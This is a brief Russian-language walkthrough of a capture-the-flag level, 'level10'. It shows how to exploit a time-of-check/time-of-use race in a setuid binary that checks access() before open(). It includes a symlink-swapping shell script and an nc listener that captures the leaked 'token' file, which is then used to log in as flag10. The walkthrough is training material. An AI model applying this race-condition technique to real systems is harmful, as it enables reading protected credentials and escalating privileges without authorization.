1. ./level10 1 1 Видим что нужен файл. Создаем файл
2. chmod +w . ; touch empty
3. ./level10 empty 1 Видим что коннект к порту 6969 по ip 1.
4. nc -l 6969 > out & Прослушаем порт 6969 через в фоновом режиме
5. ./level10 empty 127.0.0.1. Подключаемся по существующему ip 127.0.0.1 Видим другое сообщение И что-то в файле 2
6. Изменим содержимое файла и сделаем также как раньше. Видим что распечатывается содержимое файла.
7. ltrace ./level10 empty 127.0.0.1 Видим что снчала используется access для проверки доступа к файлу. В мане access написано про access и open.
8. Создаем скрипт чередования подстановки ссылок
#!/bin/sh
while true
do
	ln -fs empty link
	ln -fs token link
done

9. Запускаем прослушку в фоне nc -l 6969 > out &
Затем запускаем скрипт в фоне ./script.sh &
Отправляем ссылку на хост ./level10 link 127.0.0.1
10. Смотрим файл out видим токен от flag10
11. Заходим на flag10 юзаем getflag

